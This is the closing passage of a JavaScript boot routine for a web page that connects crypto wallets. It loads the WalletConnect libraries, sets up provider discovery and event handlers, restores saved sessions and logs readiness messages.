    if (document.readyState !== 'complete' && document.readyState !== 'interactive') {
      await new Promise((res) => {
        document.addEventListener('DOMContentLoaded', res, { once: true });
      });
    }

    cacheDomRefs();

    try {
      const libs = await loadWalletConnect();
      SignClient         = libs.SignClient;
      WalletConnectModal = libs.WalletConnectModal;
      EthereumProvider   = libs.EthereumProvider;
      logDebug('✅ All libraries loaded');

      setupEIP6963();
      wireButtons();

      // Init WC only if we have a saved session or a pending pairing.
      const needsWC = getSavedSession() || getPendingPairing();
      if (needsWC) {
        await initWalletConnect(false);
      }

      await restoreWalletConnection();
    } catch (err) {
      logDebug('Fatal: ' + err.message);
      showStatus('Failed to load wallet libraries', 'error');
      return;
    }

    // Attach lifecycle to any injected provider present at boot.
    if (window.ethereum && isDesktop()) {
      setupEVMProviderEvents(window.ethereum);
    }

    // Close WC modal on unload.
    window.addEventListener('beforeunload', () => {
      if (modal) { try { modal.closeModal(); } catch (e) {} }
    });

    logDebug(`✅ main.js ready — Platform: ${getPlatform()}`);
    console.log('✅ main.js ready — test with testTelegram("hi")');
  }

  await boot();
})();
